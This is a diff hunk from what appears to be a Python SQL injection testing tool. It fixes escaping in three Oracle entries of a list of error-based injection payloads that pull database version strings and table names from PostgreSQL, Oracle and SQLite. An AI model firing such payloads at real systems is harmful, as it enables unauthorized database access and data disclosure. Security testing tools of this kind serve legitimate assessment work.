@@ -345,9 +345,9 @@ ERROR_PAYLOADS: List[str] = [
     "' AND 1=(SELECT version())--",
     "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
     # Oracle error-based
-    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v\$version WHERE ROWNUM=1))--",
-    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v\$version WHERE ROWNUM=1))--",
-    "' AND 1=TO_NUMBER((SELECT banner FROM v\$version WHERE ROWNUM=1))--",
+    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+    "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--",
     # SQLite error-based
     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1))))--",
     "' AND 1=LOAD_EXTENSION(1)--",
